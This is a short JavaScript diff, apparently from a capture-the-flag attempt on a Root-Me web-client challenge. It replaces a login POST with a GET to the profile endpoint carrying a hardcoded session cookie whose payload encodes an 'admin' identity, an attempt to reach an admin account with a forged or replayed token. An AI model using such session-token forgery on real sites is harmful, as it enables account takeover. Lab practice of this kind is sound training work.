@@ -16,12 +16,11 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
   const username = document.getElementById("username").value;
   const secret = document.getElementById("secret").value;
 
-  const response = await fetch("https://web-client-ch6.challenge01.root-me.org:58006/login", {
-    method: "POST",
+  const response = await fetch("https://web-client-ch6.challenge01.root-me.org:58006/profile", {
+    method: "GET",
     headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ username, secret })
+      "Cookie": "eyJzZWNyZXQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifQ.aLMbcQ.y2P9SgonfLE-E97rAR1c3NrEC7g"
+    }
   });
 
   const data = await response.text(); // ou response.json() si la réponse est JSON
